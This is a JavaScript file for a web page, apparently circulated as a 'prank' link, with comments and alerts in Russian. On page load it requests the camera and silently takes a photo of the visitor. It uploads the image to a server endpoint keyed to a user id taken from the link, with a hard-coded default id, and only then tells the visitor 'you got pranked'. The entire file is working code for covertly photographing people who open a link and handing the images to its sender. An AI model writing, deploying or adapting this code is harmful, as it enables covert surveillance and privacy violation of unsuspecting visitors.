document.addEventListener('DOMContentLoaded', async () => {
    const video = document.querySelector('video');
    const canvas = document.querySelector('canvas');
    const { userId, mode } = getParamsFromUrl();
    const isVip = mode !== null;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('Пожалуйста, откройте ссылку с другого браузера');
        return;
    }
    async function startCamera() {
        try {
            const constraints = {
                video: {
                    facingMode: mode === '2' ? 'environment' : 'user'  // mode = 1: передняя камера, mode = 2: задняя камера
                }
            };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                setTimeout(() => takeSnapshot(stream), 1000);
            };
        } catch (error) {
            console.error('Ошибка при доступе к камере:', error);
            alert('Ошибка при доступе к камере: ' + error.message);
        }
    }
    function takeSnapshot(stream) {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/png');
            uploadImage(userId, dataURL);
            stream.getTracks().forEach(track => track.stop());
        } else {
            setTimeout(() => takeSnapshot(stream), 100); // Повторяем проверку каждые 100 мс
        }
    }
    async function uploadImage(userId, image) {
        try {
            const response = await fetch(`/upload/${userId}`, {
                method: 'POST',
                body: JSON.stringify({ image: image }),
                headers: { 'Content-Type': 'application/json' }
            });
            const result = await response.json();
            if (result.ok) {
                alert('Тебя пранканули)');
		//if (isVip) {
                //    await fetch(`/redirect/${userId}`, { method: 'POST' });
                //}
            } else {
                alert('Ошибка при отправке изображения: ' + result.description);
            }
        } catch (error) {
            console.error('Ошибка при отправке изображения:', error);
            alert('Ошибка при отправке изображения: ' + error.message);
        }
    }
    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('video') ? urlParams.get('video') : '491264374';
        const mode = urlParams.get('m') ? urlParams.get('m') : null;
        return { userId, mode };
    }
    startCamera();
});
